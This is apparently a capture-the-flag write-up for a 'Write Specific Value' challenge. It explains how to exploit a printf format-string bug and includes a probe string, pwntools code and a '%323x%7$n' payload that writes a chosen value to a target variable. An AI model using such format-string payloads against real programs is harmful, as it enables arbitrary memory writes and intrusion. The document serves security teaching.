# Challenge `Write Specific Value` Writeup

- Vulnerability: 
  - Format strings
- Where:
  - printf function
- Impact:
  - allows to write in arbitrary memory

## Steps to reproduce

Sending the following format string
```
"AAAA.%08x.%08x.%08x.%08x.%08x.%08x.%08x"
```
we can verify that the 7th register is filled with `41414141` (the value of `AAAA`) which tells us that we control the 7th register.

To get the address of the `target` variable we use:
```py
elf = ELF("04_match_value")
target_address = elf.symbols['target']
```

Now we can write the address of the target variable to this register and then use the `%n` specifier to write anything there. However this time we must write a specific value. Since the %n specifier writes the number of bytes written so far, we can use padding to write any amount of bytes we want and then write the value to the target address:
```py
io = connect(HOST, PORT)
payload = p32(target_address) + b"%323x%7$n"
io.sendline(payload)
```

In this case we want to write 327 bytes so by sending the address we are writing 4 bytes and then we write 323 bytes of padding which together will make 327 bytes.

## Implementation

Implementation(write-specific-value.py).
